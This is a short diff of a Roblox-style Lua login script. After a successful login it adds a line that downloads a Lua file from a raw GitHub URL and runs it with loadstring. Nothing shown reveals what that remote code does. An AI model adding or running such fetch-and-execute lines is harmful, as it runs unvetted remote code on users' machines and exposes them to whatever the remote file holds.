@@ -106,6 +106,7 @@ LoginButton.MouseButton1Click:Connect(function()
             Duration = 4
         })
         Frame:Destroy()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/springsouzex/luasouza/refs/heads/main/message.lua"))()
         -- Código protegido pós login aqui
     else
         StarterGui:SetCore("SendNotification", {
